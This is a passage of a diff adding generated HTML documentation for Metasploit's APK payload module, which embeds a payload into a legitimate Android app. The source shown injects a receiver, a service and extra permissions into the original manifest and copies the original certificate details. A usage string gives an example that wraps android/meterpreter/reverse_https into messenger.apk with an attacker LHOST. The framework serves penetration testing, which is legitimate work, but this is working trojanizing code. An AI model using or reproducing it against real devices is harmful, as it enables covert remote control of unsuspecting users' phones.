+      <span class='id identifier rubyid_add_permissions'>add_permissions</span> <span class='op'>+=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_permission'>permission</span><span class='period'>.</span><span class='id identifier rubyid_to_xml'>to_xml</span><span class='rbracket'>]</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_add_permissions'>add_permissions</span><span class='period'>.</span><span class='id identifier rubyid_shuffle!'>shuffle!</span>
+  <span class='kw'>for</span> <span class='id identifier rubyid_permission_xml'>permission_xml</span> <span class='kw'>in</span> <span class='id identifier rubyid_add_permissions'>add_permissions</span>
+    <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Adding </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_permission_xml'>permission_xml</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_original_permissions'>original_permissions</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+      <span class='id identifier rubyid_application'>application</span><span class='period'>.</span><span class='id identifier rubyid_before'>before</span><span class='lparen'>(</span><span class='id identifier rubyid_permission_xml'>permission_xml</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_original_permissions'>original_permissions</span> <span class='op'>=</span> <span class='id identifier rubyid_original_manifest'>original_manifest</span><span class='period'>.</span><span class='id identifier rubyid_xpath'>xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>//manifest/uses-permission</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+    <span class='kw'>else</span>
+      <span class='id identifier rubyid_original_permissions'>original_permissions</span><span class='period'>.</span><span class='id identifier rubyid_before'>before</span><span class='lparen'>(</span><span class='id identifier rubyid_permission_xml'>permission_xml</span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_application'>application</span> <span class='op'>=</span> <span class='id identifier rubyid_original_manifest'>original_manifest</span><span class='period'>.</span><span class='id identifier rubyid_at_xpath'>at_xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/manifest/application</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_receiver'>receiver</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_manifest'>payload_manifest</span><span class='period'>.</span><span class='id identifier rubyid_at_xpath'>at_xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/manifest/application/receiver</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_service'>service</span> <span class='op'>=</span> <span class='id identifier rubyid_payload_manifest'>payload_manifest</span><span class='period'>.</span><span class='id identifier rubyid_at_xpath'>at_xpath</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/manifest/application/service</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_receiver'>receiver</span><span class='period'>.</span><span class='id identifier rubyid_attributes'>attributes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_package'>package</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_main_broadcast_receiver'>main_broadcast_receiver</span>
+  <span class='id identifier rubyid_receiver'>receiver</span><span class='period'>.</span><span class='id identifier rubyid_attributes'>attributes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>label</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_main_broadcast_receiver'>main_broadcast_receiver</span>
+  <span class='id identifier rubyid_service'>service</span><span class='period'>.</span><span class='id identifier rubyid_attributes'>attributes</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>name</span><span class='tstring_end'>&quot;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_package'>package</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_main_service'>main_service</span>
+  <span class='id identifier rubyid_application'>application</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_receiver'>receiver</span><span class='period'>.</span><span class='id identifier rubyid_to_xml'>to_xml</span>
+  <span class='id identifier rubyid_application'>application</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_service'>service</span><span class='period'>.</span><span class='id identifier rubyid_to_xml'>to_xml</span>
+
+  <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_tempdir'>tempdir</span><span class='embexpr_end'>}</span><span class='tstring_content'>/original/AndroidManifest.xml</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>wb</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_file'>file</span><span class='op'>|</span> <span class='id identifier rubyid_file'>file</span><span class='period'>.</span><span class='id identifier rubyid_puts'>puts</span> <span class='id identifier rubyid_original_manifest'>original_manifest</span><span class='period'>.</span><span class='id identifier rubyid_to_xml'>to_xml</span> <span class='rbrace'>}</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="parse_manifest-instance_method">
+  
+    #<strong>parse_manifest</strong>(manifest_file)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+71
+72
+73
+74
+75
+76</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 71</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_parse_manifest'>parse_manifest</span><span class='lparen'>(</span><span class='id identifier rubyid_manifest_file'>manifest_file</span><span class='rparen'>)</span>
+  <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_manifest_file'>manifest_file</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>rb</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_file'>file</span><span class='op'>|</span>
+    <span class='id identifier rubyid_data'>data</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span><span class='lparen'>(</span><span class='id identifier rubyid_file'>file</span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='lparen'>(</span><span class='id identifier rubyid_data'>data</span><span class='rparen'>)</span>
+  <span class='rbrace'>}</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="parse_orig_cert_data-instance_method">
+  
+    #<strong>parse_orig_cert_data</strong>(orig_apkfile)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 125</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_parse_orig_cert_data'>parse_orig_cert_data</span><span class='lparen'>(</span><span class='id identifier rubyid_orig_apkfile'>orig_apkfile</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span> <span class='op'>=</span> <span class='const'>Array</span><span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_keytool_output'>keytool_output</span> <span class='op'>=</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>keytool</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-J-Duser.language=en</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-printcert</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>-jarfile</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_orig_apkfile'>orig_apkfile</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_owner_line'>owner_line</span> <span class='op'>=</span> <span class='id identifier rubyid_keytool_output'>keytool_output</span><span class='period'>.</span><span class='id identifier rubyid_match'>match</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Owner:.+</span><span class='regexp_end'>/</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_orig_cert_dname'>orig_cert_dname</span> <span class='op'>=</span> <span class='id identifier rubyid_owner_line'>owner_line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^.*:</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='period'>.</span><span class='id identifier rubyid_push'>push</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_orig_cert_dname'>orig_cert_dname</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_valid_from_line'>valid_from_line</span> <span class='op'>=</span> <span class='id identifier rubyid_keytool_output'>keytool_output</span><span class='period'>.</span><span class='id identifier rubyid_match'>match</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Valid from:.+</span><span class='regexp_end'>/</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_from_date_str'>from_date_str</span> <span class='op'>=</span> <span class='id identifier rubyid_valid_from_line'>valid_from_line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Valid from:</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>until:.+</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='id identifier rubyid_to_date_str'>to_date_str</span> <span class='op'>=</span> <span class='id identifier rubyid_valid_from_line'>valid_from_line</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Valid from:.+until:</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='id identifier rubyid_from_date'>from_date</span> <span class='op'>=</span> <span class='const'>DateTime</span><span class='period'>.</span><span class='id identifier rubyid_parse'>parse</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_from_date_str'>from_date_str</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='period'>.</span><span class='id identifier rubyid_push'>push</span><span class='lparen'>(</span><span class='id identifier rubyid_from_date'>from_date</span><span class='period'>.</span><span class='id identifier rubyid_strftime'>strftime</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>%Y/%m/%d %T</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_to_date'>to_date</span> <span class='op'>=</span> <span class='const'>DateTime</span><span class='period'>.</span><span class='id identifier rubyid_parse'>parse</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_to_date_str'>to_date_str</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_validity'>validity</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_to_date'>to_date</span> <span class='op'>-</span> <span class='id identifier rubyid_from_date'>from_date</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span>
+  <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span><span class='period'>.</span><span class='id identifier rubyid_push'>push</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_validity'>validity</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_orig_cert_data'>orig_cert_data</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="print_error-instance_method">
+  
+    #<strong>print_error</strong>(msg = &#39;&#39;)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+    <span class="aliases">Also known as:
+    <span class="names"><span id='print_bad-instance_method'>print_bad</span></span>
+    </span>
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+17
+18
+19</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 17</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_msg'>msg</span><span class='op'>=</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='gvar'>$stderr</span><span class='period'>.</span><span class='id identifier rubyid_puts'>puts</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[-] </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_msg'>msg</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="print_status-instance_method">
+  
+    #<strong>print_status</strong>(msg = &#39;&#39;)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+13
+14
+15</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 13</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='id identifier rubyid_msg'>msg</span><span class='op'>=</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='gvar'>$stderr</span><span class='period'>.</span><span class='id identifier rubyid_puts'>puts</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[*] </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_msg'>msg</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="run_cmd-instance_method">
+  
+    #<strong>run_cmd</strong>(cmd)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+28
+29
+30
+31
+32
+33
+34
+35</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 28</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_run_cmd'>run_cmd</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='rparen'>)</span>
+  <span class='kw'>begin</span>
+    <span class='id identifier rubyid_stdin'>stdin</span><span class='comma'>,</span> <span class='id identifier rubyid_stdout'>stdout</span><span class='comma'>,</span> <span class='id identifier rubyid_stderr'>stderr</span> <span class='op'>=</span> <span class='const'>Open3</span><span class='period'>.</span><span class='id identifier rubyid_popen3'>popen3</span><span class='lparen'>(</span><span class='op'>*</span><span class='id identifier rubyid_cmd'>cmd</span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='id identifier rubyid_stdout'>stdout</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span> <span class='op'>+</span> <span class='id identifier rubyid_stderr'>stderr</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span>
+  <span class='kw'>rescue</span> <span class='const'>Errno</span><span class='op'>::</span><span class='const'>ENOENT</span>
+    <span class='kw'>return</span> <span class='kw'>nil</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="usage-instance_method">
+  
+    #<strong>usage</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+23
+24
+25
+26</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/apk.rb', line 23</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_usage'>usage</span>
+  <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Usage: </span><span class='embexpr_beg'>#{</span><span class='gvar'>$0</span><span class='embexpr_end'>}</span><span class='tstring_content'> -x [target.apk] [msfvenom options]\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>e.g. </span><span class='embexpr_beg'>#{</span><span class='gvar'>$0</span><span class='embexpr_end'>}</span><span class='tstring_content'> -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n</span><span class='tstring_end'>&quot;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:32:50 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
